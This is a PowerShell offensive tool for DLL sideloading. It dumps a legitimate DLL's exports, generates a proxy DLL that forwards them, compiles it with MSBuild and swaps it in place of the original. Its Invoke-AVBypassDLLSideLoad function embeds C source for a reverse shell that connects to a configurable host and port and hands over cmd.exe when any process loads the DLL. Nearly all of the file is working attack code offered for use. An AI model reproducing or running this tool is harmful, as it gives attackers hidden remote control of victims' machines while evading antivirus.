#Ripped from https://alastaircrabtree.com/how-to-find-latest-version-of-msbuild-in-powershell/
Function Find-MsBuild()
{
	$buildtoolspath32 = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\msbuild.exe"
	$buildtoolspath64 = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\amd64\msbuild.exe"
	
	
	If (Test-Path $buildtoolspath32) { return $buildtoolspath32 } 
	If (Test-Path $buildtoolspath64) { return $buildtoolspath64 } 

    throw "Unable to find msbuild, please install Build Tools for VS 2019!!"
}

$RevShellDLLSource = @" 
#include "pch.h"
#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#pragma comment(lib,"ws2_32")


using namespace std;

#define SCSIZE 2048
void ExecutePayload(void);
WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;
BOOL WINAPI

DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{

	case DLL_PROCESS_ATTACH:
		ExecutePayload();
		break;

	case DLL_PROCESS_DETACH:
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;

}


void ExecutePayload(void) {
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,
		(unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(#PORT#);
	hax.sin_addr.s_addr = inet_addr((LPSTR)"#IP#");
	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	TCHAR commandLine[256] = L"cmd.exe";
	CreateProcess(NULL, commandLine, NULL, NULL, TRUE,
		0, NULL, NULL, &sui, &pi);
}

"@

$MainDLLSource = @" 
#include "pch.h"
#include "stdafx.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:	
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


"@ 
Function Invoke-DLLSideload([string] $OriginalInDLL = "original.dll", [string] $maliciousDLL = "payload.dll")
{
##Generate temp xml file name
$xmlFileOut = [System.IO.Path]::GetTempFileName() -replace '.*\\', '' -replace '.tmp','.xml'

##Location of the DLL source file that we will write to
$dllSourceOut = "DLLSideLoadCompiler\DLLSideLoadCompiler\DLLSideLoadCompiler.cpp"

##Location of the original DLL path
$OriginalInDLLFullPath =  [string](Get-Location) + "\" + $OriginalInDLL

##Location of the DLLMain source file that we will write to
$dllMainSourceOut = "DLLSideLoadCompiler\DLLSideLoadCompiler\dllmain.cpp"

##The the original DLL will be named 
$originalOutDLL = [string](Get-Location) + "\" + [string]([System.IO.Path]::GetTempFileName() -replace '.*\\', '' -replace '.tmp','.dll')

##Location of the project sln file to compile
$dllTempSln = [string](Get-Location) + "\DLLSideLoadCompiler\DLLSideLoadCompiler.sln"

##Location of output DLL when compiled 
$outPutDLL = [string](Get-Location) + "\DLLSideLoadCompiler\Debug\DLLSideLoadCompiler.dll"

Write-Host "[+] Dumping functions from DLL $OriginalInDLL into $xmlFileOut"

#Extract DLL function calls from the supplied DLL , dump data into xml FILE
.\dllexp.exe /from_files $OriginalInDLLFullPath  /ScanExports 1 /sxml $xmlFileOut | Out-Null

Write-Host "[+] Waiting for XML file to be created"
#Just to be sure it's done
Start-Sleep -s 2

Write-Host "[+] Backing up the and renaming the original DLL.."
#Rename the original DLL to match the one refferd to inside the generated one
Copy-Item -Path $OriginalInDLL -Destination $originalOutDLL

Move-Item -Path $OriginalInDLL -Destination ($OriginalInDLL + ".bak")

Write-Host "[+] Reading functions from XML dump"
#Read XML data
[xml]$xmldata = Get-Content -Path $xmlFileOut 

Write-Host "[+] Clearing $dllSourceOut for old content"
#Empty the .cpp file
Out-File -FilePath $dllSourceOut

Write-Host "[+] Parsing and writing code into $dllSourceOut"
#Parse and print into C code
"#include `"pch.h`" `n" | Out-File -FilePath $dllSourceOut -Append
"#include `"stdafx.h`" `n" | Out-File -FilePath $dllSourceOut -Append

"HINSTANCE hDll = LoadLibrary(L`"$([System.IO.Path]::GetFileNameWithoutExtension($maliciousDLL) + ".dll")`");`n" | Out-File -FilePath $dllSourceOut -Append

$counter = 0
$xmldata.exported_functions_list | ForEach-Object {
	$_.item | ForEach-Object {
		$counter++
		"`#pragma comment(linker, `"/export:$($_.function_name)=$([System.IO.Path]::GetFileNameWithoutExtension($originalOutDLL)).$($_.function_name),`@$($counter)`")" | Out-File -FilePath $dllSourceOut -Append

	}
}
Write-Host "[+] Writing entrypoint to dllmain.cpp"
Out-File -FilePath $dllMainSourceOut -InputObject $MainDLLSource 

Write-Host "[+] Removing the XML dump"
#Remove the XML file, don't need it anymore
Remove-Item -Path $xmlFileOut

Write-Host "[+] Compiling proxy DLL using MSBuild from Build Tools 2019!"
#build the project
.$(Find-MsBuild) $dllTempSln /p:Platform=x86 | Out-Null

Write-Host "[+] Moving the compiled DLL into directory"

#Move the compiled DLL so it matches the originl input DLL
Move-Item -Path $outPutDLL -Destination $OriginalInDLL

}


Function Invoke-AVBypassDLLSideLoad([string] $OriginalInDLL = "original.dll", [string] $HostIP = "127.0.0.1", [string] $HostPORT = "1337" )
{

##Replacing IP and PORT
$RevShellDLLSource = $RevShellDLLSource -replace "#IP#", $HostIP
$RevShellDLLSource = $RevShellDLLSource -replace "#PORT#", $HostPORT

##Generate temp xml file name
$xmlFileOut = [System.IO.Path]::GetTempFileName() -replace '.*\\', '' -replace '.tmp','.xml'

##Location of the DLL source file that we will write to
$dllSourceOut = "DLLSideLoadCompiler\DLLSideLoadCompiler\DLLSideLoadCompiler.cpp"

##Location of the DLLMain source file that we will write to
$dllMainSourceOut = "DLLSideLoadCompiler\DLLSideLoadCompiler\dllmain.cpp"

##Location of the original DLL path
$OriginalInDLLFullPath =  [string](Get-Location) + "\" + $OriginalInDLL

##The the original DLL will be named 
$originalOutDLL = [string](Get-Location) + "\" + [string]([System.IO.Path]::GetTempFileName() -replace '.*\\', '' -replace '.tmp','.dll')

##Location of the project sln file to compile
$dllTempSln = [string](Get-Location) + "\DLLSideLoadCompiler\DLLSideLoadCompiler.sln"

##Location of output DLL when compiled 
$outPutDLL = [string](Get-Location) + "\DLLSideLoadCompiler\Debug\DLLSideLoadCompiler.dll"

Write-Host "[+] Dumping functions from DLL $OriginalInDLLFullPath into $xmlFileOut"

#Extract DLL function calls from the supplied DLL , dump data into xml FILE
.\dllexp.exe /from_files $OriginalInDLLFullPath  /ScanExports 1 /sxml $xmlFileOut 

Write-Host "[+] Waiting for XML file to be created"
#Just to be sure it's done
Start-Sleep -s 2

Write-Host "[+] Backing up the and renaming the original DLL.."

#Rename the original DLL to match the one refferd to inside the generated one
Copy-Item -Path $OriginalInDLL -Destination $originalOutDLL

Move-Item -Path $OriginalInDLL -Destination ($OriginalInDLL + ".bak")

Write-Host "[+] Reading functions from XML dump"

#Read XML data
[xml]$xmldata = Get-Content -Path $xmlFileOut 

Write-Host "[+] Clearing $dllSourceOut for old content"

#Empty the .cpp file
Out-File -FilePath $dllSourceOut

Write-Host "[+] Parsing and writing code into $dllSourceOut"
#Parse and print into C code
"#include `"pch.h`" `n" | Out-File -FilePath $dllSourceOut -Append

$counter = 0
$xmldata.exported_functions_list | ForEach-Object {
	$_.item | ForEach-Object {
		$counter++
		"`#pragma comment(linker, `"/export:$($_.function_name)=$([System.IO.Path]::GetFileNameWithoutExtension($originalOutDLL)).$($_.function_name),`@$($counter)`")" | Out-File -FilePath $dllSourceOut -Append

	}
}


Write-Host "[+] Writing revshell payload to dllmain.cpp"
Out-File -FilePath $dllMainSourceOut -InputObject $RevShellDLLSource 

Write-Host "[+] Removing the temp  XML dump"
#Remove the XML file, don't need it anymore
Remove-Item -Path $xmlFileOut

Write-Host "[+] Compiling proxy DLL using MSBuild from Build Tools 2019!"
#build the project
.$(Find-MsBuild) $dllTempSln /p:Platform=x86 | Out-Null

Write-Host "[+] Moving the compiled DLL into directory"

#Move the compiled DLL so it matches the originl input DLL
Move-Item -Path $outPutDLL -Destination $OriginalInDLL

}

